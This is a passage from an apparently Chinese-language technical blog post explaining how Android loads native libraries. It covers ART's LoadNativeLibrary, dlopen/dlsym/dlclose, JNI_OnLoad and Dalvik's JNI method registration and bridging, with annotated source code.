loader</span></span><br><span class="line">  <span class="comment">// matches, return successfully without doing anything.</span></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> for better results we should canonicalize the pathname (or even compare</span></span><br><span class="line">  <span class="comment">// inodes). This implementation is fine if everybody is using System.loadLibrary.</span></span><br><span class="line">  SharedLibrary* library;</span><br><span class="line">  Thread* self = Thread::Current();</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> move the locking (and more of this logic) into Libraries.</span></span><br><span class="line">    <span class="function">MutexLock <span class="title">mu</span><span class="params">(self, *Locks::jni_libraries_lock_)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里的libraries_是一个LibraryList类，里面记录的是所有被Crazy Linker加载过的动态链接库</span></span><br><span class="line">    <span class="comment">// 在这里面查一查，如果有，那就说明已经被加载了。</span></span><br><span class="line">    library = libraries_-&gt;Get(path); </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// LibraryList中存在目标库</span></span><br><span class="line">  <span class="keyword">if</span> (library != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// 首先判断是否是由同一个Classloader加载的</span></span><br><span class="line">    <span class="comment">// 如果不是，返回异常。因为同一个so库只能被同一个classloader加载</span></span><br><span class="line">    <span class="keyword">if</span> (env-&gt;IsSameObject(library-&gt;GetClassLoader(), class_loader) == JNI_FALSE) &#123;</span><br><span class="line">      <span class="comment">// The library will be associated with class_loader. The JNI</span></span><br><span class="line">      <span class="comment">// spec says we can't load the same library into more than one</span></span><br><span class="line">      <span class="comment">// class loader.</span></span><br><span class="line">      StringAppendF(error_msg, <span class="string">"Shared library \"%s\" already opened by "</span></span><br><span class="line">          <span class="string">"ClassLoader %p; can't open in ClassLoader %p"</span>,</span><br><span class="line">          path.c_str(), library-&gt;GetClassLoader(), class_loader);</span><br><span class="line">      LOG(WARNING) &lt;&lt; error_msg;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 已经加载了这个so库，判断以前是否加载成功</span></span><br><span class="line">    <span class="comment">// 以前加载成功，返回true</span></span><br><span class="line">    <span class="comment">// 以前加载失败，返回false</span></span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"[Shared library \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\" already loaded in "</span></span><br><span class="line">              &lt;&lt; <span class="string">" ClassLoader "</span> &lt;&lt; class_loader &lt;&lt; <span class="string">"]"</span>;</span><br><span class="line">    <span class="keyword">if</span> (!library-&gt;CheckOnLoadResult()) &#123;</span><br><span class="line">      StringAppendF(error_msg, <span class="string">"JNI_OnLoad failed on a previous attempt "</span></span><br><span class="line">          <span class="string">"to load \"%s\""</span>, path.c_str());</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the shared library.  Because we're using a full path, the system</span></span><br><span class="line">  <span class="comment">// doesn't have to search through LD_LIBRARY_PATH.  (It may do so to</span></span><br><span class="line">  <span class="comment">// resolve this library's dependencies though.)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Failures here are expected when java.library.path has several entries</span></span><br><span class="line">  <span class="comment">// and we have to hunt for the lib.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Below we dlopen but there is no paired dlclose, this would be necessary if we supported</span></span><br><span class="line">  <span class="comment">// class unloading. Libraries will only be unloaded when the reference count (incremented by</span></span><br><span class="line">  <span class="comment">// dlopen) becomes zero from dlclose.</span></span><br><span class="line"></span><br><span class="line">  Locks::mutator_lock_-&gt;AssertNotHeld(self);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 拿到so的全路径</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* path_str = path.empty() ? <span class="literal">nullptr</span> : path.c_str();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 使用dlopen打开目标库</span></span><br><span class="line">  <span class="comment">// dlopen的作用是将目标库加载进调用进程的虚拟地址空间并增加该库的打开引用计数</span></span><br><span class="line">  <span class="comment">// 它在成功时会返回一个句柄，后续对它的函数调用就可以直接使用该句柄了。</span></span><br><span class="line">  <span class="comment">// 如果发生错误，比如无法找到库，那么会返回NULL。</span></span><br><span class="line">  <span class="comment">// 如果目标库还依赖其他共享库，那么dlopen会自动加载那些库，如果有必要的话，这一过程会递归进行。</span></span><br><span class="line">  <span class="comment">// 加载进来的库也就呗称为这个库的依赖树。</span></span><br><span class="line">  <span class="comment">// 可以多次调用dlopen，但是库加载进内存的操作只会发生一次，所有的调用都返回相同的句柄值。</span></span><br><span class="line">  <span class="comment">// 但dloepn会为每次打开都维护一个引用计数，每次打开都会增加，关闭就会减少。</span></span><br><span class="line">  <span class="comment">// 当引用计数等于0时，就从内存中删掉这个库。</span></span><br><span class="line">  <span class="keyword">void</span>* handle = dlopen(path_str, RTLD_NOW);</span><br><span class="line">  <span class="keyword">bool</span> needs_native_bridge = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (handle == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果handle为空，也就意味着加载失败可</span></span><br><span class="line">    <span class="comment">// 这时候再判断该路径是否支持native bridge，</span></span><br><span class="line">    <span class="comment">// 如果支持，那么就再次尝试加载。也就是到java.library.path</span></span><br><span class="line">    <span class="keyword">if</span> (android::NativeBridgeIsSupported(path_str)) &#123;</span><br><span class="line">      handle = android::NativeBridgeLoadLibrary(path_str, RTLD_NOW);</span><br><span class="line">      needs_native_bridge = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  VLOG(jni) &lt;&lt; <span class="string">"[Call to dlopen(\""</span> &lt;&lt; path &lt;&lt; <span class="string">"\", RTLD_NOW) returned "</span> &lt;&lt; handle &lt;&lt; <span class="string">"]"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果经过上面两次加载，仍然为null，抛出异常</span></span><br><span class="line">  <span class="keyword">if</span> (handle == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    *error_msg = dlerror();</span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"dlopen(\""</span> &lt;&lt; path &lt;&lt; <span class="string">"\", RTLD_NOW) failed: "</span> &lt;&lt; *error_msg;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查打开的过程中是否存在异常</span></span><br><span class="line">  <span class="keyword">if</span> (env-&gt;ExceptionCheck() == JNI_TRUE) &#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"Unexpected exception:"</span>;</span><br><span class="line">    env-&gt;ExceptionDescribe();</span><br><span class="line">    env-&gt;ExceptionClear();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Create a new entry.</span></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> move the locking (and more of this logic) into Libraries.</span></span><br><span class="line">  <span class="keyword">bool</span> created_library = <span class="literal">false</span>;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Create SharedLibrary ahead of taking the libraries lock to maintain lock ordering.</span></span><br><span class="line">    <span class="comment">// 创建一个共享文件库Entry</span></span><br><span class="line">    <span class="comment">// 因为是多线程的，所以在这里需要判断我们创建的时候是否已经有其他线程先于我们创建了同一个共享文件库。</span></span><br><span class="line">    <span class="comment">// 如果有，那么这里的加载其实就是不必要的了(因为其他线程已经加载了这个库)。</span></span><br><span class="line">    <span class="comment">// 所以直接释放当前的资源即可，并调用CheckOnLoadResult</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;SharedLibrary&gt; new_library(</span><br><span class="line">        <span class="keyword">new</span> SharedLibrary(env, self, path, handle, class_loader));</span><br><span class="line">    <span class="function">MutexLock <span class="title">mu</span><span class="params">(self, *Locks::jni_libraries_lock_)</span></span>;</span><br><span class="line">    library = libraries_-&gt;Get(path);</span><br><span class="line">    <span class="keyword">if</span> (library == <span class="literal">nullptr</span>) &#123;  <span class="comment">// We won race to get libraries_lock.</span></span><br><span class="line">      library = new_library.release();</span><br><span class="line">      libraries_-&gt;Put(path, library);</span><br><span class="line">      created_library = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!created_library) &#123;</span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">"WOW: we lost a race to add shared library: "</span></span><br><span class="line">        &lt;&lt; <span class="string">"\""</span> &lt;&lt; path &lt;&lt; <span class="string">"\" ClassLoader="</span> &lt;&lt; class_loader;</span><br><span class="line">    <span class="keyword">return</span> library-&gt;CheckOnLoadResult();</span><br><span class="line">  &#125;</span><br><span class="line">  VLOG(jni) &lt;&lt; <span class="string">"[Added shared library \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\" for ClassLoader "</span> &lt;&lt; class_loader &lt;&lt; <span class="string">"]"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 上面有两次加载so，所以这里需要通过标志位判断到底是用哪种方式加载的</span></span><br><span class="line">  <span class="comment">// 对于正常加载的流程来说，使用dlsym获取JNI_OnLoad的地址</span></span><br><span class="line">  <span class="keyword">bool</span> was_successful = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">void</span>* sym;</span><br><span class="line">  <span class="keyword">if</span> (needs_native_bridge) &#123;</span><br><span class="line">    library-&gt;SetNeedsNativeBridge();</span><br><span class="line">    sym = library-&gt;FindSymbolWithNativeBridge(<span class="string">"JNI_OnLoad"</span>, <span class="literal">nullptr</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    sym = dlsym(handle, <span class="string">"JNI_OnLoad"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (sym == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"[No JNI_OnLoad found in \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\"]"</span>;</span><br><span class="line">    was_successful = <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Call JNI_OnLoad.  We have to override the current class</span></span><br><span class="line">    <span class="comment">// loader, which will always be "null" since the stuff at the</span></span><br><span class="line">    <span class="comment">// top of the stack is around Runtime.loadLibrary().  (See</span></span><br><span class="line">    <span class="comment">// the comments in the JNI FindClass function.)</span></span><br><span class="line">    ScopedLocalRef&lt;jobject&gt; old_class_loader(env, env-&gt;NewLocalRef(self-&gt;GetClassLoaderOverride()));</span><br><span class="line">    self-&gt;SetClassLoaderOverride(class_loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取JNI的版本信息</span></span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"[Calling JNI_OnLoad in \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\"]"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*JNI_OnLoadFn)</span><span class="params">(JavaVM*, <span class="keyword">void</span>*)</span></span>;</span><br><span class="line">    JNI_OnLoadFn jni_on_load = <span class="keyword">reinterpret_cast</span>&lt;JNI_OnLoadFn&gt;(sym);</span><br><span class="line">    <span class="keyword">int</span> version = (*jni_on_load)(<span class="keyword">this</span>, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (runtime_-&gt;GetTargetSdkVersion() != <span class="number">0</span> &amp;&amp; runtime_-&gt;GetTargetSdkVersion() &lt;= <span class="number">21</span>) &#123;</span><br><span class="line">      fault_manager.EnsureArtActionInFrontOfSignalChain();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    self-&gt;SetClassLoaderOverride(old_class_loader.get());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (version == JNI_ERR) &#123;</span><br><span class="line">      StringAppendF(error_msg, <span class="string">"JNI_ERR returned from JNI_OnLoad in \"%s\""</span>, path.c_str());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IsBadJniVersion(version)) &#123;</span><br><span class="line">      StringAppendF(error_msg, <span class="string">"Bad JNI version returned from JNI_OnLoad in \"%s\": %d"</span>,</span><br><span class="line">                    path.c_str(), version);</span><br><span class="line">      <span class="comment">// It's unwise to call dlclose() here, but we can mark it</span></span><br><span class="line">      <span class="comment">// as bad and ensure that future load attempts will fail.</span></span><br><span class="line">      <span class="comment">// We don't know how far JNI_OnLoad got, so there could</span></span><br><span class="line">      <span class="comment">// be some partially-initialized stuff accessible through</span></span><br><span class="line">      <span class="comment">// newly-registered native method calls.  We could try to</span></span><br><span class="line">      <span class="comment">// unregister them, but that doesn't seem worthwhile.</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      was_successful = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    VLOG(jni) &lt;&lt; <span class="string">"[Returned "</span> &lt;&lt; (was_successful ? <span class="string">"successfully"</span> : <span class="string">"failure"</span>)</span><br><span class="line">              &lt;&lt; <span class="string">" from JNI_OnLoad in \""</span> &lt;&lt; path &lt;&lt; <span class="string">"\"]"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  library-&gt;SetResult(was_successful);</span><br><span class="line">  <span class="keyword">return</span> was_successful;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dlopen-const-char-libfilename-int-flags"><a href="#dlopen-const-char-libfilename-int-flags" class="headerlink" title="dlopen(const char *libfilename, int flags)"></a>dlopen(const char *libfilename, int flags)</h2><p>dlopen的作用是将目标库加载进调用进程的虚拟地址空间并增加该库的打开引用计数，它在成功时会返回一个句柄，后续对它的函数调用就可以直接使用该句柄了。</p><p>如果发生错误，比如无法找到库，那么会返回NULL。</p><p>如果目标库还依赖其他共享库，那么dlopen会自动加载那些库，如果有必要的话，这一过程会递归进行。加载进来的库也就被称为这个库的依赖树。</p><p>可以多次调用dlopen，但是库加载进内存的操作只会发生一次，所有的调用都返回相同的句柄值。但dloepn会为每次打开都维护一个引用计数，每次打开都会增加，关闭就会减少。当引用计数等于0时，就从内存中删掉这个库（调用dlclose）。</p><p><strong>这里的源码太长（位置在bionic/linker/dlfcn.cpp），所以这里总结一下内容：</strong></p><p>触发dlopen时会做各种判断，包括flag是否正确、targetSDK是否匹配、so是否已加载等等。</p><p>然后根据传入的flag、name等参数构建一个soinfo对象（也就是ELF文件）。配置完基本信息后就加入到LoadTaskList中。</p><p>对于加载失败的so，例如现在需要连续加载test1和test2，但是1成功了，2失败了，也会卸载掉所有本次加载成功的so。</p><p>上述操作返回后（一个soinfo），判断so的构造方法是否已经被调用了，如果没有，则调用构造方法。递归加载所有子类的构造函数，然后再初始化本身。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bionic/linker/linker.cpp 中 void soinfo::call_constructors()</span></span><br><span class="line"></span><br><span class="line">get_children().for_each([] (soinfo* si) &#123;</span><br><span class="line">  si-&gt;call_constructors();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DT_INIT should be called before DT_INIT_ARRAY if both are present.</span></span><br><span class="line">call_function(<span class="string">"DT_INIT"</span>, init_func_); <span class="comment">// 调用init_func_这个函数</span></span><br><span class="line">call_array(<span class="string">"DT_INIT_ARRAY"</span>, init_array_, init_array_count_, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>然后设置其引用计数。也就是说，调用一次，引用计数就会加一。</p><h2 id="dlsym-void-handle-char-symbol"><a href="#dlsym-void-handle-char-symbol" class="headerlink" title="dlsym(void handle, char symbol)"></a>dlsym(void <em>handle, char </em>symbol)</h2><p>它会在handle指向的库以及该库的依赖树中搜索名为symbol的符号（函数或变量）。</p><p>如果找到了symbol，那么dlsym会返回其地址，否则返回NULL</p><h2 id="dlclose-void-handle"><a href="#dlclose-void-handle" class="headerlink" title="dlclose(void *handle)"></a>dlclose(void *handle)</h2><p>它会减少handle所引用的库的打开引用计数，如果这个引用计数变成了0并且其他库已经不再需要用到该库中的内容了，那么就会卸载这个库。对于这个库的依赖树而言，会递归执行。</p><h2 id="JNI-OnLoad相关"><a href="#JNI-OnLoad相关" class="headerlink" title="JNI_OnLoad相关"></a>JNI_OnLoad相关</h2><p>以下面的JNI_OnLoad的示例举例，位置在device/sample/frameworks/PlatformLibrary/jni/PlatformLibrary.cpp。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is called by the VM when the shared library is first loaded.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span> </span>&#123;</span><br><span class="line">    JNIEnv* env = <span class="literal">NULL</span>;</span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;GetEnv((<span class="keyword">void</span>**) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123;</span><br><span class="line">        ALOGE(<span class="string">"ERROR: GetEnv failed\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(env != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (registerMethods(env) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">"ERROR: PlatformLibrary native registration failed\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* success -- return valid version number */</span></span><br><span class="line">    result = JNI_VERSION_1_4;</span><br><span class="line"></span><br><span class="line">bail:</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用registerMethods显式注册本地方法，首先查找目标class，找到之后调用RegisterNatives根据传入的gmethods对象注册本地所有方法。gMethods对象包含java层的方法签名、java名、本地方法指针：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Explicitly register all methods for our class.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * While we're at it, cache some class references and method/field IDs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns 0 on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerMethods</span><span class="params">(JNIEnv* env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> kClassName =</span><br><span class="line">        <span class="string">"com/example/android/platform_library/PlatformLibrary"</span>;</span><br><span class="line">    jclass clazz;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* look up the class */</span></span><br><span class="line">    clazz = env-&gt;FindClass(kClassName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">"Can't find class %s\n"</span>, kClassName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* register all the methods */</span></span><br><span class="line">    <span class="keyword">if</span> (env-&gt;RegisterNatives(clazz, gMethods,</span><br><span class="line">            <span class="keyword">sizeof</span>(gMethods) / <span class="keyword">sizeof</span>(gMethods[<span class="number">0</span>])) != JNI_OK)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"Failed registering methods for %s\n"</span>, kClassName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fill out the rest of the ID cache */</span></span><br><span class="line">    <span class="keyword">return</span> cacheIds(env, clazz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着就调用虚拟机中的RegisterNatives方法。遍历gMethods，依次注册。这部分代码摘自网络，Android源码里没找到，没有定位到Dalvik虚拟机那一层</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">dvmRegisterJNIMethod</span><span class="params">(ClassObject* clazz, <span class="keyword">const</span> <span class="keyword">char</span>* methodName,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* signature, <span class="keyword">void</span>* fnPtr)</span> </span>&#123;</span><br><span class="line">    Method* method = dvmFindDirectMethodByDescriptor(clazz, methodName, signature);</span><br><span class="line">    <span class="keyword">if</span> (method == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        method = dvmFindVirtualMethodByDescriptor(clazz, methodName, signature);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dvmUseJNIBridge(method, fnPtr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过函数名称和签名在指定的类中找到对应的Method，然后调用dvmUseJNIBridge为这个Method设置一个Bridge。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dvmUseJNIBridge</span><span class="params">(Method* method, <span class="keyword">void</span>* func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DalvikBridgeFunc bridge = shouldTrace(method)</span><br><span class="line">        ? dvmTraceCallJNIMethod</span><br><span class="line">        : dvmSelectJNIBridge(method);</span><br><span class="line">    dvmSetNativeFunc(method, bridge, func);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先获取一个DalvikBridgeFunc，然后再去调dvmSetNativeFunc。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dvmSetNativeFunc</span><span class="params">(Method* method, DalvikBridgeFunc func,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> u2* insns)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ClassObject* clazz = method-&gt;clazz;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (insns != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        method-&gt;insns = insns;</span><br><span class="line">        android_atomic_release_store((<span class="keyword">int32_t</span>) func,</span><br><span class="line">            (<span class="keyword">void</span>*) &amp;method-&gt;nativeFunc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        method-&gt;nativeFunc = func;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的函数指针赋给了insns，而nativeFunc设成了Bridge，为什么要这么做呢？解释器中执行到一个native函数时，调用的是其nativeFunc，也就是Bridge了，然后再调insns执行真正的函数。</p><p>再来看被动注册。在类加载过程中，会扫描类的各个函数，调用loadMethodFromDex加载函数。当发现是native时，会将其nativeFunc设为dvmResolveNativeMethod。当没有主动注册时，调到这个native函数就会执行到dvmResolveNativeMethod，否则就会执行到Bridge。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadMethodFromDex</span><span class="params">(ClassObject* clazz, <span class="keyword">const</span> DexMethod* pDexMethod,</span></span></span><br><span class="line"><span class="function"><span class="params">    Method* meth)</span> </span>&#123;</span><br><span class="line">    ..........</span><br><span class="line">    <span class="keyword">if</span> (dvmIsNativeMethod(meth)) &#123;</span><br><span class="line">        meth-&gt;nativeFunc = dvmResolveNativeMethod;</span><br><span class="line">        meth-&gt;jniArgInfo = computeJniArgInfo(&amp;meth-&gt;prototype);</span><br><span class="line">    &#125;</span><br><span class="line">    ..........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dvmResolveNativeMethod</span><span class="params">(<span class="keyword">const</span> u4* args, JValue* pResult,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> Method* method, Thread* self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ClassObject* clazz = method-&gt;clazz;</span><br><span class="line">    <span class="keyword">void</span>* func;</span><br><span class="line"></span><br><span class="line">    ..........</span><br><span class="line"></span><br><span class="line">    func = lookupSharedLibMethod(method);</span><br><span class="line">    <span class="keyword">if</span> (func != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        dvmUseJNIBridge((Method*) method, func);</span><br><span class="line">        (*method-&gt;nativeFunc)(args, pResult, method, self);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先找到Method对应的函数指针，然后给Method设置一个Bridge，然后执行这个Bridge。看来不管是主动注册还是被动注册，都逃不掉Bridge。我们来看看是怎么通过Method找到对应的函数指针的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">lookupSharedLibMethod</span><span class="params">(<span class="keyword">const</span> Method* method)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*) dvmHashForeach(gDvm.nativeLibs, findMethodInLib,</span><br><span class="line">        (<span class="keyword">void</span>*) method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">findMethodInLib</span><span class="params">(<span class="keyword">void</span>* vlib, <span class="keyword">void</span>* vmethod)</span> </span>&#123;</span><br><span class="line">    ..........</span><br><span class="line"></span><br><span class="line">    preMangleCM =</span><br><span class="line">        createJniNameString(meth-&gt;clazz-&gt;descriptor, meth-&gt;name, &amp;len);</span><br><span class="line"></span><br><span class="line">    mangleCM = mangleString(preMangleCM, len);</span><br><span class="line"></span><br><span class="line">    func = 